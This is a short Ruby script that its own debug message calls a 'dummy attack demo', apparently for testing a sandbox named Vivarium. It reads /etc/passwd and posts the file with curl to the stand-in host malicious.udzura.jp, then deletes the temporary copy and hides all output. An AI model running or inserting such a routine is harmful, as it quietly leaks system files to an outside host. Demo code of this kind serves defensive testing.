def debug_output(msg)
  $stderr.puts("[DEBUG] #{msg}") if ENV["VIVARIUM_DEBUG"]
end

debug_output "=== dummy attack demo ==="
system "cat /etc/passwd > /tmp/___________copy.txt 2>&1 || true"
system "curl -d@/tmp/___________copy.txt http://malicious.udzura.jp >/dev/null 2>&1 || true"
system "rm -f /tmp/___________copy.txt >/dev/null 2>&1 || true"
debug_output "=== done ==="